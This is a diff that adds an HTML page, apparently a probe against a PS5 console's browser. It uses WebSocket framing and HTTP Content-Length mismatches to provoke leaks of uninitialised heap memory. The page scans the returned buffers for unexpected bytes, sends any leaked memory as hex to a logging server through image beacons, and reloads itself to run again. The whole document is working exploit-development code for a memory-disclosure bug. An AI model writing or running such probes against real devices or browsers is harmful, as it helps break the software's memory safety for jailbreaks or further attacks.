@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V642</title></head>
+<body><pre id="out">V642 — WS desync heap leak probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<80;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V642-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+function bytes2hex(arr,off,len){
+  var h='';off=off||0;len=Math.min(len||64,arr.length-off);
+  for(var i=off;i<off+len;i++) h+=('0'+arr[i].toString(16)).slice(-2);
+  return h;
+}
+
+bk('BOOT','v642-ws-desync');
+
+var msgIdx = 0;
+var nonZeroLeaks = [];
+
+function analyzeMessage(data, idx) {
+  if (typeof data === 'string') {
+    bk('MSG-'+idx, 'text,len='+data.length+',v='+data.slice(0,120));
+    return;
+  }
+  // ArrayBuffer from binary frame
+  var view = new Uint8Array(data);
+  var len = view.length;
+
+  // Scan for non-zero bytes that might be uninitialized heap
+  // The server sends specific patterns: 0xBB for P9, 0xCC for P10, 0xDD for P11, 0xEE for P17
+  // Any other non-zero byte in an unexpected location = potential heap leak
+  var knownPatterns = {0xBB:1, 0xCC:1, 0xDD:1, 0xEE:1, 0x00:1};
+  var unknownNonZero = 0;
+  var firstUnknown = -1;
+  var uniqueBytes = {};
+
+  for (var i = 0; i < len; i++) {
+    if (view[i] !== 0) {
+      uniqueBytes[view[i]] = (uniqueBytes[view[i]]||0) + 1;
+      if (!knownPatterns[view[i]]) {
+        unknownNonZero++;
+        if (firstUnknown < 0) firstUnknown = i;
+      }
+    }
+  }
+
+  var summary = 'bin,len='+len+',unk='+unknownNonZero+',first='+firstUnknown;
+  var byteKeys = Object.keys(uniqueBytes).slice(0,8).join('/');
+  summary += ',bytes='+byteKeys;
+  bk('MSG-'+idx, summary);
+
+  // If we found unknown non-zero bytes, this is a potential leak!
+  if (unknownNonZero > 0 && firstUnknown >= 0) {
+    bk('LEAK-'+idx, 'off='+firstUnknown+',cnt='+unknownNonZero+',hex='+bytes2hex(view,firstUnknown,64));
+    nonZeroLeaks.push({idx:idx, off:firstUnknown, cnt:unknownNonZero});
+  }
+
+  // Also check: did the frame contain MORE bytes than the server intended?
+  // P9 sends 50 bytes (14B "ONLY-50-BYTES-" + 36x 0xBB)
+  // If we got >50 bytes in a binary frame with 0xBB, extra bytes are heap
+  if (len > 50 && view[14] === 0xBB) {
+    var extraStart = -1;
+    for (var j = 50; j < len; j++) {
+      if (view[j] !== 0xBB) { extraStart = j; break; }
+    }
+    if (extraStart >= 0) {
+      bk('P9-EXTRA', 'len='+len+',extraAt='+extraStart+',hex='+bytes2hex(view,extraStart,64));
+    } else if (len > 50) {
+      bk('P9-OVERREAD', 'len='+len+',all-BB-past-50');
+    }
+  }
+}
+
+try {
+  var ws = new WebSocket('ws://<HOST_IP>:9090/probe-leak');
+  ws.binaryType = 'arraybuffer';
+  bk('WS-OPEN', 'connecting');
+
+  ws.onopen = function() {
+    bk('WS-CONN', 'ok');
+    // Send a message to identify ourselves
+    ws.send('V642-PS5-DESYNC-PROBE');
+  };
+
+  ws.onmessage = function(ev) {
+    analyzeMessage(ev.data, msgIdx);
+    msgIdx++;
+  };
+
+  ws.onerror = function(ev) {
+    bk('WS-ERR', 'error');
+  };
+
+  ws.onclose = function(ev) {
+    bk('WS-CLOSE', 'code='+ev.code+',reason='+ev.reason.slice(0,60)+',msgs='+msgIdx+',leaks='+nonZeroLeaks.length);
+
+    if (nonZeroLeaks.length > 0) {
+      bk('LEAK-SUMMARY', JSON.stringify(nonZeroLeaks).slice(0,600));
+    }
+
+    // After WS closes, do a second connection with different framing
+    setTimeout(testRawHTTP, 500);
+  };
+} catch(e) {
+  bk('WS-FAIL', e.name+':'+e.message.slice(0,80));
+  setTimeout(testRawHTTP, 100);
+}
+
+/* ================================================================
+ * TEST B: XHR to /truncated-leak (raw TCP CL mismatch)
+ * Server sends Content-Length:4096 but only 2048 bytes
+ * ================================================================ */
+function testRawHTTP() {
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/truncated-leak?sz=4096&actual=2048', true);
+    xhr.responseType = 'arraybuffer';
+    xhr.timeout = 5000;
+    xhr.onload = function() {
+      var ab = xhr.response;
+      if (ab) {
+        var view = new Uint8Array(ab);
+        var nonZero = 0, firstNZ = -1;
+        for (var i = 2048; i < view.length; i++) {
+          if (view[i] !== 0) { nonZero++; if (firstNZ < 0) firstNZ = i; }
+        }
+        bk('HTTP-CL', 'len='+ab.byteLength+',status='+xhr.status+',nz='+nonZero+',first='+firstNZ);
+        if (nonZero > 0 && firstNZ >= 0) bk('HTTP-LEAK', bytes2hex(view, firstNZ, 64));
+      } else {
+        bk('HTTP-CL', 'no-response');
+      }
+      testFetchDesync();
+    };
+    xhr.onerror = function() { bk('HTTP-CL', 'error'); testFetchDesync(); };
+    xhr.ontimeout = function() { bk('HTTP-CL', 'timeout'); testFetchDesync(); };
+    xhr.send();
+  } catch(e) { bk('HTTP-ERR', e.name); testFetchDesync(); }
+}
+
+/* ================================================================
+ * TEST C: Fetch API with ReadableStream + manual chunk reading
+ * Check if chunks contain uninit data past the response
+ * ================================================================ */
+function testFetchDesync() {
+  try {
+    if (typeof fetch === 'undefined' || typeof ReadableStream === 'undefined') {
+      bk('FETCH-CAP', 'no-fetch-or-rs');
+      finishAll();
+      return;
+    }
+    bk('FETCH-CAP', 'ok');
+
+    // Fetch a normal page but read via stream to check buffer boundaries
+    fetch('/beacon/V642-FETCH-PING?d=1&t='+Date.now(), {method:'GET'}).then(function(resp) {
+      var reader = resp.body.getReader();
+      var chunks = [];
+      function pump() {
+        return reader.read().then(function(result) {
+          if (result.done) {
+            var totalLen = 0;
+            chunks.forEach(function(c){totalLen+=c.length;});
+            bk('FETCH-STREAM', 'chunks='+chunks.length+',total='+totalLen);
+            finishAll();
+            return;
+          }
+          chunks.push(result.value);
+          if (chunks.length < 10) return pump();
+          bk('FETCH-STREAM', 'toomany');
+          finishAll();
+        });
+      }
+      pump().catch(function(e){bk('FETCH-PUMP-ERR',e.name);finishAll();});
+    }).catch(function(e){bk('FETCH-ERR',e.name);finishAll();});
+  } catch(e) { bk('FETCH-ERR2', e.name); finishAll(); }
+}
+
+function finishAll() {
+  bk('DONE', 'msgs='+msgIdx+',leaks='+nonZeroLeaks.length);
+  say('DONE — msgs:'+msgIdx+' leaks:'+nonZeroLeaks.length);
+  setTimeout(function(){ location.reload(); }, 25000);
+}
+</script>
+</body></html>
